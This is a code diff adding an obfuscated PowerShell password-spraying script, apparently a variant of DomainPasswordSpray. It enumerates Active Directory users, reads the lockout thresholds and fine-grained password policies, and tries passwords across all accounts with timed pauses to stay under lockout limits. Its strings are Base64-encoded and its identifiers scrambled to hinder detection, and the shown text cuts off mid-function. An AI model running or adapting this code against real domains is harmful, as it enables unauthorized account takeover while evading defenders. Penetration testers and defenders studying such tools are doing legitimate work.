@@ -1,0 +1,364 @@
+function Invoke-DomainPasswordSpray{
+    param(
+     [Parameter(Position = 0, Mandatory = $false)]
+     [string]
+     $UserList = "",
+     [Parameter(Position = 1, Mandatory = $false)]
+     [string]
+     $Password,
+     [Parameter(Position = 2, Mandatory = $false)]
+     [string]
+     $PasswordList,
+     [Parameter(Position = 3, Mandatory = $false)]
+     [string]
+     $OutFile,
+     [Parameter(Position = 4, Mandatory = $false)]
+     [string]
+     $Filter = "",
+     [Parameter(Position = 5, Mandatory = $false)]
+     [string]
+     $Domain = "",
+     [Parameter(Position = 6, Mandatory = $false)]
+     [switch]
+     $Force,
+     [Parameter(Position = 7, Mandatory = $false)]
+     [switch]
+     $UsernameAsPassword,
+     [Parameter(Position = 8, Mandatory = $false)]
+     [int]
+     $Delay=0,
+     [Parameter(Position = 9, Mandatory = $false)]
+     $Jitter=0,
+     [Parameter(Position = 10, Mandatory = $false)]
+     [switch]
+     $Quiet,
+     [Parameter(Position = 11, Mandatory = $false)]
+     [int]
+     $Fudge=10
+    )
+    if ($Password)
+    {
+        ${_/\__/=\_/=\/=\__} = @($Password)
+    }
+    elseif($UsernameAsPassword)
+    {
+        ${_/\__/=\_/=\/=\__} = ""
+    }
+    elseif($PasswordList)
+    {
+        ${_/\__/=\_/=\/=\__} = gc $PasswordList
+    }
+    else
+    {
+        Write-Host -ForegroundColor Red $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAAtAFAAYQBzAHMAdwBvAHIAZAAgAG8AcgAgAC0AUABhAHMAcwB3AG8AcgBkAEwAaQBzAHQAIABvAHAAdABpAG8AbgAgAG0AdQBzAHQAIABiAGUAIABzAHAAZQBjAGkAZgBpAGUAZAA=')))
+        break
+    }
+    try
+    {
+        if ($Domain -ne "")
+        {
+            ${_/=====\___/\_/\_} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABvAG0AYQBpAG4A'))),$Domain)
+            ${/==\/\/=\_/\/\/==} = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${_/=====\___/\_/\_})
+            ${/=\/\/=\/\_/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA='))) + ([ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAEQAbwBtAGEAaQBuAA==')))).distinguishedName
+        }
+        else
+        {
+            ${/==\/\/=\_/\/\/==} = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            ${/=\/\/=\/\_/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA='))) + ([ADSI]"").distinguishedName
+        }
+    }
+    catch
+    {
+        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAG8AdQBsAGQAIABuAG8AdAAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAC4AIABUAHIAeQAgAHMAcABlAGMAaQBmAHkAaQBuAGcAIAB0AGgAZQAgAGQAbwBtAGEAaQBuACAAbgBhAG0AZQAgAHcAaQB0AGgAIAB0AGgAZQAgAC0ARABvAG0AYQBpAG4AIABvAHAAdABpAG8AbgAuAA==')))
+        break
+    }
+    if ($UserList -eq "")
+    {
+        ${__/=\____/==\_/\/\} = ____/\/\_/\/=\_/\/ -Domain $Domain -_/=\/=\_/==\/=\/\_ -_____/=\/\_/\_/=\_ -Filter $Filter
+    }
+    else
+    {
+        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAAkAFUAcwBlAHIATABpAHMAdAAgAGEAcwAgAHUAcwBlAHIAbABpAHMAdAAgAHQAbwAgAHMAcAByAGEAeQAgAHcAaQB0AGgA')))
+        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABXAGEAcgBuAGkAbgBnADoAIABVAHMAZQByAHMAIAB3AGkAbABsACAAbgBvAHQAIABiAGUAIABjAGgAZQBjAGsAZQBkACAAZgBvAHIAIABsAG8AYwBrAG8AdQB0ACAAdABoAHIAZQBzAGgAbwBsAGQALgA=')))
+        ${__/=\____/==\_/\/\} = @()
+        try
+        {
+            ${__/=\____/==\_/\/\} = gc $UserList -ErrorAction stop
+        }
+        catch [Exception]
+        {
+            Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABfAC4ARQB4AGMAZQBwAHQAaQBvAG4A')))
+            break
+        }
+    }
+    if (${_/\__/=\_/=\/=\__}.count -gt 1)
+    {
+        Write-Host -ForegroundColor Yellow $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABXAEEAUgBOAEkATgBHACAALQAgAEIAZQAgAHYAZQByAHkAIABjAGEAcgBlAGYAdQBsACAAbgBvAHQAIAB0AG8AIABsAG8AYwBrACAAbwB1AHQAIABhAGMAYwBvAHUAbgB0AHMAIAB3AGkAdABoACAAdABoAGUAIABwAGEAcwBzAHcAbwByAGQAIABsAGkAcwB0ACAAbwBwAHQAaQBvAG4AIQA=')))
+    }
+    ${__/======\/==\/==} = _____/\/\/=\_____/ ${/=\/\/=\/\_/\/===}
+    Write-Host -ForegroundColor Yellow $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAZQAgAGQAbwBtAGEAaQBuACAAcABhAHMAcwB3AG8AcgBkACAAcABvAGwAaQBjAHkAIABvAGIAcwBlAHIAdgBhAHQAaQBvAG4AIAB3AGkAbgBkAG8AdwAgAGkAcwAgAHMAZQB0ACAAdABvACAAJAB7AF8AXwAvAD0APQA9AD0APQA9AFwALwA9AD0AXAAvAD0APQB9ACAAbQBpAG4AdQB0AGUAcwAuAA==')))
+    Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAGUAdAB0AGkAbgBnACAAYQAgACQAewBfAF8ALwA9AD0APQA9AD0APQBcAC8APQA9AFwALwA9AD0AfQAgAG0AaQBuAHUAdABlACAAdwBhAGkAdAAgAGkAbgAgAGIAZQB0AHcAZQBlAG4AIABzAHAAcgBhAHkAcwAuAA==')))
+    if (!$Force)
+    {
+        ${__/\/=\/\/=\__/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AZgBpAHIAbQAgAFAAYQBzAHMAdwBvAHIAZAAgAFMAcAByAGEAeQA=')))
+        ${___/\__/====\___/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGUAIAB5AG8AdQAgAHMAdQByAGUAIAB5AG8AdQAgAHcAYQBuAHQAIAB0AG8AIABwAGUAcgBmAG8AcgBtACAAYQAgAHAAYQBzAHMAdwBvAHIAZAAgAHMAcAByAGEAeQAgAGEAZwBhAGkAbgBzAHQAIAA='))) + ${__/=\____/==\_/\/\}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAGMAYwBvAHUAbgB0AHMAPwA=')))
+        ${__/\__/=====\_/==} = New-Object System.Management.Automation.Host.ChoiceDescription $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JgBZAGUAcwA='))), `
+            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAZQBtAHAAdABzACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIAAxACAAdABpAG0AZQAgAHAAZQByACAAdQBzAGUAcgAgAGkAbgAgAHQAaABlACAAbABpAHMAdAAgAGYAbwByACAAZQBhAGMAaAAgAHAAYQBzAHMAdwBvAHIAZAAgAGkAbgAgAHQAaABlACAAcABhAHMAcwB3AG8AcgBkAGwAaQBzAHQAIABmAGkAbABlAC4A')))
+        ${/==\_/\___/\/\___} = New-Object System.Management.Automation.Host.ChoiceDescription $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JgBOAG8A'))), `
+            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AYwBlAGwAcwAgAHQAaABlACAAcABhAHMAcwB3AG8AcgBkACAAcwBwAHIAYQB5AC4A')))
+        ${___/==\_____/\___} = [System.Management.Automation.Host.ChoiceDescription[]](${__/\__/=====\_/==}, ${/==\_/\___/\/\___})
+        ${____/=\/\_/\/\/\_} = $host.ui.PromptForChoice(${__/\/=\/\/=\__/\/}, ${___/\__/====\___/\}, ${___/==\_____/\___}, 0)
+        if (${____/=\/\_/\/\/\_} -ne 0)
+        {
+            Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AYwBlAGwAbABpAG4AZwAgAHQAaABlACAAcABhAHMAcwB3AG8AcgBkACAAcwBwAHIAYQB5AC4A')))
+            break
+        }
+    }
+    Write-Host -ForegroundColor Yellow $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcwBzAHcAbwByAGQAIABzAHAAcgBhAHkAaQBuAGcAIABoAGEAcwAgAGIAZQBnAHUAbgAgAHcAaQB0AGgAIAA='))) ${_/\__/=\_/=\/=\__}.count $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABwAGEAcwBzAHcAbwByAGQAcwA=')))
+    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAaQBzACAAbQBpAGcAaAB0ACAAdABhAGsAZQAgAGEAIAB3AGgAaQBsAGUAIABkAGUAcABlAG4AZABpAG4AZwAgAG8AbgAgAHQAaABlACAAdABvAHQAYQBsACAAbgB1AG0AYgBlAHIAIABvAGYAIAB1AHMAZQByAHMA')))
+    if($UsernameAsPassword)
+    {
+        __/===\/=\/\/==\/\ -Domain ${/=\/\/=\/\_/\/===} -__/=\____/==\_/\/\ ${__/=\____/==\_/\/\} -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword -Quiet $Quiet
+    }
+    else
+    {
+        for(${/\____/\_____/\_/} = 0; ${/\____/\_____/\_/} -lt ${_/\__/=\_/=\/=\__}.count; ${/\____/\_____/\_/}++)
+        {
+            __/===\/=\/\/==\/\ -Domain ${/=\/\/=\/\_/\/===} -__/=\____/==\_/\/\ ${__/=\____/==\_/\/\} -Password ${_/\__/=\_/=\/=\__}[${/\____/\_____/\_/}] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet
+            if ((${/\____/\_____/\_/}+1) -lt ${_/\__/=\_/=\/=\__}.count)
+            {
+                __/\_/\_/\/=====\/ -_/===\_______/\_/\ (60*${__/======\/==\/==} + $Fudge) -Quiet $Quiet
+            }
+        }
+    }
+    Write-Host -ForegroundColor Yellow $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcwBzAHcAbwByAGQAIABzAHAAcgBhAHkAaQBuAGcAIABpAHMAIABjAG8AbQBwAGwAZQB0AGUA')))
+    if ($OutFile -ne "")
+    {
+        Write-Host -ForegroundColor Yellow $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAG4AeQAgAHAAYQBzAHMAdwBvAHIAZABzACAAdABoAGEAdAAgAHcAZQByAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHMAcAByAGEAeQBlAGQAIABoAGEAdgBlACAAYgBlAGUAbgAgAG8AdQB0AHAAdQB0ACAAdABvACAAJABPAHUAdABGAGkAbABlAA==')))
+    }
+}
+function __/\_/\_/\/=====\/
+{
+    param(
+        ${_/===\_______/\_/\} = 1800,
+        ${___/\__/====\___/\} = "[*] Pausing to avoid account lockout.",
+        [switch] $Quiet = $False
+    )
+    if ($quiet)
+    {
+        Write-Host "${___/\__/====\___/\}: Waiting for $(${_/===\_______/\_/\}/60) minutes. $(${_/===\_______/\_/\} - ${/===\_/==\_/==\_/})"
+        sleep -Seconds ${_/===\_______/\_/\}
+    } else {
+        foreach (${/===\_/==\_/==\_/} in (1..${_/===\_______/\_/\}))
+        {
+            Write-Progress -Id 1 -Activity ${___/\__/====\___/\} -Status "Waiting for $(${_/===\_______/\_/\}/60) minutes. $(${_/===\_______/\_/\} - ${/===\_/==\_/==\_/}) seconds remaining" -PercentComplete ((${/===\_/==\_/==\_/} / ${_/===\_______/\_/\}) * 100)
+            sleep -Seconds 1
+        }
+        Write-Progress -Id 1 -Activity ${___/\__/====\___/\} -Status $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcABsAGUAdABlAGQA'))) -PercentComplete 100 -Completed
+    }
+}
+function ____/\/\_/\/=\_/\/
+{
+    param(
+     [Parameter(Position = 0, Mandatory = $false)]
+     [string]
+     $Domain = "",
+     [Parameter(Position = 1, Mandatory = $false)]
+     [switch]
+     ${_/=\/=\_/==\/=\/\_},
+     [Parameter(Position = 2, Mandatory = $false)]
+     [switch]
+     ${_____/=\/\_/\_/=\_},
+     [Parameter(Position = 3, Mandatory = $false)]
+     [string]
+     $Filter
+    )
+    try
+    {
+        if ($Domain -ne "")
+        {
+            ${_/=====\___/\_/\_} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABvAG0AYQBpAG4A'))),$Domain)
+            ${/==\/\/=\_/\/\/==} =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${_/=====\___/\_/\_})
+            ${/=\/\/=\/\_/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA='))) + ([ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAEQAbwBtAGEAaQBuAA==')))).distinguishedName
+        }
+        else
+        {
+            ${/==\/\/=\_/\/\/==} =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            ${/=\/\/=\/\_/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA='))) + ([ADSI]"").distinguishedName
+        }
+    }
+    catch
+    {
+        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAG8AdQBsAGQAIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGUAIABkAG8AbQBhAGkAbgAuACAAVAByAHkAIABzAHAAZQBjAGkAZgB5AGkAbgBnACAAdABoAGUAIABkAG8AbQBhAGkAbgAgAG4AYQBtAGUAIAB3AGkAdABoACAAdABoAGUAIAAtAEQAbwBtAGEAaQBuACAAbwBwAHQAaQBvAG4ALgA=')))
+        break
+    }
+    ${_/=\__/=====\_/\/} = [ADSI] "LDAP://$(${/==\/\/=\_/\/\/==}.PDCRoleOwner)"
+    ${__/\/=\_/=\_/=\/=} = @()
+    ${__/\/=\_/=\_/=\/=} += ${_/=\__/=====\_/\/}.Properties.lockoutthreshold
+    ${___/\____/==\____} = [int] ${_/=\__/=====\_/\/}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAGIAZQBoAGEAdgBpAG8AcgAtAHYAZQByAHMAaQBvAG4A')))].item(0)
+    if (${___/\____/==\____} -ge 3)
+    {
+        Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAHUAcgByAGUAbgB0ACAAZABvAG0AYQBpAG4AIABpAHMAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEYAaQBuAGUALQBHAHIAYQBpAG4AZQBkACAAUABhAHMAcwB3AG8AcgBkACAAUABvAGwAaQBjAHkALgA=')))
+        ${_/\_/=====\____/=} = New-Object System.DirectoryServices.DirectorySearcher
+        ${_/\_/=====\____/=}.SearchRoot = ${_/=\__/=====\_/\/}
+        ${_/\_/=====\____/=}.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABjAGwAYQBzAHMAPQBtAHMARABTAC0AUABhAHMAcwB3AG8AcgBkAFMAZQB0AHQAaQBuAGcAcwApAA==')))
+        ${__/\_/\_/=\_/\_/=} = ${_/\_/=====\____/=}.FindAll()
+        if ( ${__/\_/\_/=\_/\_/=}.count -gt 0)
+        {
+            Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${__/\_/\_/=\_/\_/=}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABGAGkAbgBlAC0ARwByAGEAaQBuAGUAZAAgAFAAYQBzAHMAdwBvAHIAZAAgAHAAbwBsAGkAYwBpAGUAcwAgAHcAZQByAGUAIABmAG8AdQBuAGQALgANAAoA'))))
+            foreach(${/====\_/\/\__/=\/} in ${__/\_/\_/=\_/\_/=})
+            {
+                ${/==\_/=\/==\/\_/=} = ${/====\_/\/\__/=\/} | select -ExpandProperty Properties
+                ${___/==\/\/\_/=\/=} = ${/==\_/=\/==\/\_/=}.name
+                ${_/\_/=\/==\/=\/\/} = ${/==\_/=\/==\/\_/=}.'msds-lockoutthreshold'
+                ${/===\_/\_______/=} = ${/==\_/=\/==\/\_/=}.'msds-psoappliesto'
+                ${/==\____/\/===\__} = ${/==\_/=\/==\/\_/=}.'msds-minimumpasswordlength'
+                ${__/\/=\_/=\_/=\/=} += ${_/\_/=\/==\/=\/\/}
+                Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABGAGkAbgBlAC0ARwByAGEAaQBuAGUAZAAgAFAAYQBzAHMAdwBvAHIAZAAgAFAAbwBsAGkAYwB5ACAAdABpAHQAbABlAGQAOgAgACQAewBfAF8AXwAvAD0APQBcAC8AXAAvAFwAXwAvAD0AXAAvAD0AfQAgAGgAYQBzACAAYQAgAEwAbwBjAGsAbwB1AHQAIABUAGgAcgBlAHMAaABvAGwAZAAgAG8AZgAgACQAewBfAC8AXABfAC8APQBcAC8APQA9AFwALwA9AFwALwBcAC8AfQAgAGEAdAB0AGUAbQBwAHQAcwAsACAAbQBpAG4AaQBtAHUAbQAgAHAAYQBzAHMAdwBvAHIAZAAgAGwAZQBuAGcAdABoACAAbwBmACAAJAB7AC8APQA9AFwAXwBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwB9ACAAYwBoAGEAcgBzACwAIABhAG4AZAAgAGEAcABwAGwAaQBlAHMAIAB0AG8AIAAkAHsALwA9AD0APQBcAF8ALwBcAF8AXwBfAF8AXwBfAF8ALwA9AH0ALgANAAoA')))
+            }
+        }
+    }
+    ${__/======\/==\/==} = _____/\/\/=\_____/ ${/=\/\/=\/\_/\/===}
+    [int]${_/\/=\_____/\__/\} = ${__/\/=\_/=\_/=\/=} | sort | Select -First 1
+    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGMAcgBlAGEAdABpAG4AZwAgAGEAIABsAGkAcwB0ACAAbwBmACAAdQBzAGUAcgBzACAAdABvACAAcwBwAHIAYQB5AC4ALgAuAA==')))
+    if (${_/\/=\_____/\__/\} -eq "0")
+    {
+        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAZQByAGUAIABhAHAAcABlAGEAcgBzACAAdABvACAAYgBlACAAbgBvACAAbABvAGMAawBvAHUAdAAgAHAAbwBsAGkAYwB5AC4A')))
+    }
+    else
+    {
+        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAZQAgAHMAbQBhAGwAbABlAHMAdAAgAGwAbwBjAGsAbwB1AHQAIAB0AGgAcgBlAHMAaABvAGwAZAAgAGQAaQBzAGMAbwB2AGUAcgBlAGQAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuACAAaQBzACAAJAB7AF8ALwBcAC8APQBcAF8AXwBfAF8AXwAvAFwAXwBfAC8AXAB9ACAAbABvAGcAaQBuACAAYQB0AHQAZQBtAHAAdABzAC4A')))
+    }
+    ${/=\___/\/==\/==\/} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${/=\/\/=\/\_/\/===})
+    ${_/==\_/=\__/=\/==} = New-Object System.DirectoryServices.DirectoryEntry
+    ${/=\___/\/==\/==\/}.SearchRoot = ${_/==\_/=\__/=\/==}
+    ${/=\___/\/==\/==\/}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))) > $Null
+    ${/=\___/\/==\/==\/}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA==')))) > $Null
+    ${/=\___/\/==\/==\/}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA')))) > $Null
+    if (${_/=\/=\_/==\/=\/\_})
+    {
+        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAGUAbQBvAHYAaQBuAGcAIABkAGkAcwBhAGIAbABlAGQAIAB1AHMAZQByAHMAIABmAHIAbwBtACAAbABpAHMAdAAuAA==')))
+        ${/=\___/\/==\/==\/}.filter =
+            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAoACEAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADYAKQAoACEAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAJABGAGkAbAB0AGUAcgApAA==')))
+    }
+    else
+    {
+        ${/=\___/\/==\/==\/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAkAEYAaQBsAHQAZQByACkA')))
+    }
+    ${/=\___/\/==\/==\/}.PropertiesToLoad.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))) > $Null
+    ${/=\___/\/==\/==\/}.PropertiesToLoad.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGkAbQBlAA==')))) > $Null
+    ${/=\___/\/==\/==\/}.PropertiesToLoad.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA==')))) > $Null
+    ${/=\___/\/==\/==\/}.PropertiesToLoad.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA')))) > $Null
+    ${/=\___/\/==\/==\/}.PageSize = 1000
+    ${_/====\_/\/\/=\/=} = ${/=\___/\/==\/==\/}.FindAll()
+    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAZQByAGUAIABhAHIAZQAgAA=='))) + ${_/====\_/\/\/=\/=}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAB0AG8AdABhAGwAIAB1AHMAZQByAHMAIABmAG8AdQBuAGQALgA='))))
+    ${__/=\____/==\_/\/\} = [System.Collections.Generic.List[String]]::new()
+    if (${_____/=\/\_/\_/=\_})
+    {
+        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAGUAbQBvAHYAaQBuAGcAIAB1AHMAZQByAHMAIAB3AGkAdABoAGkAbgAgADEAIABhAHQAdABlAG0AcAB0ACAAbwBmACAAbABvAGMAawBpAG4AZwAgAG8AdQB0ACAAZgByAG8AbQAgAGwAaQBzAHQALgA=')))
+        foreach (${____/\/\/=\_/\/==} in ${_/====\_/\/\/=\/=})
+        {
+            ${__/=\/\__/\/=\___} = ${____/\/\/=\_/\/==}.Properties.badpwdcount
+            ${_/\/==\/=\/===\/=} = ${____/\/\/=\_/\/==}.Properties.samaccountname
+            try
+            {
+                ${/==\/=\_/\_/=\/=\} = ${____/\/\/=\_/\/==}.Properties.badpasswordtime[0]
+            }
+            catch
+            {
+                continue
+            }
+            ${/\_____/=\_/\_/==} = Get-Date
+            ${/====\____/\/\/==} = [DateTime]::FromFileTime(${/==\/=\_/\_/=\/=\})
+            ${_/=\__/\/=\/==\/=} = (${/\_____/=\_/\_/==} - ${/====\____/\/\/==}).TotalMinutes
+            if (${__/=\/\__/\/=\___})
+            {
+                [int]${____/\/\/\___/===} = [convert]::ToInt32(${__/=\/\__/\/=\___}, 10)
+                ${_______/\/\_/=\/=} = ${_/\/=\_____/\__/\} - ${____/\/\/\___/===}
+                if ((${_/=\__/\/=\/==\/=} -gt ${__/======\/==\/==}) -or (${_______/\/\_/=\/=} -gt 1))
+                                {
+                    ${__/=\____/==\_/\/\}.Add(${_/\/==\/=\/===\/=})
+                }
+            }
+        }
+    }
+    else
+    {
+        foreach (${____/\/\/=\_/\/==} in ${_/====\_/\/\/=\/=})
+        {
+            ${_/\/==\/=\/===\/=} = ${____/\/\/=\_/\/==}.Properties.samaccountname
+            ${__/=\____/==\_/\/\}.Add(${_/\/==\/=\/===\/=})
+        }
+    }
+    Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAHIAZQBhAHQAZQBkACAAYQAgAHUAcwBlAHIAbABpAHMAdAAgAGMAbwBuAHQAYQBpAG4AaQBuAGcAIAA='))) + ${__/=\____/==\_/\/\}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAB1AHMAZQByAHMAIABnAGEAdABoAGUAcgBlAGQAIABmAHIAbwBtACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAnAHMAIABkAG8AbQBhAGkAbgA='))))
+    return ${__/=\____/==\_/\/\}
+}
+function __/===\/=\/\/==\/\
+{
+    param(
+            [Parameter(Position=1)]
+            $Domain,
+            [Parameter(Position=2)]
+            [string[]]
+            ${__/=\____/==\_/\/\},
+            [Parameter(Position=3)]
+            [string]
+            $Password,
+            [Parameter(Position=4)]
+            [string]
+            $OutFile,
+            [Parameter(Position=5)]
+            [int]
+            $Delay=0,
+            [Parameter(Position=6)]
+            [double]
+            $Jitter=0,
+            [Parameter(Position=7)]
+            [switch]
+            $UsernameAsPassword,
+            [Parameter(Position=7)]
+            [switch]
+            $Quiet
+    )
+    ${_/==\_/==\/\/==\_} = Get-Date
+    ${/===\_/==\_/==\_/} = ${__/=\____/==\_/\/\}.count
+    Write-Host "[*] Now trying password $Password against ${/===\_/==\_/==\_/} users. Current time is $(${_/==\_/==\/\/==\_}.ToShortTimeString())"
+    ${_/===\/\/==\/=\/\} = 0
+    if ($OutFile -ne ""-and -not $Quiet)
+    {
+        Write-Host -ForegroundColor Yellow $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABXAHIAaQB0AGkAbgBnACAAcwB1AGMAYwBlAHMAcwBlAHMAIAB0AG8AIAAkAE8AdQB0AEYAaQBsAGUA')))    
+    }
+    ${/=\/\/=\/==\____/} = New-Object System.Random
+    foreach (${____/\/\/=\_/\/==} in ${__/=\____/==\_/\/\})
+    {
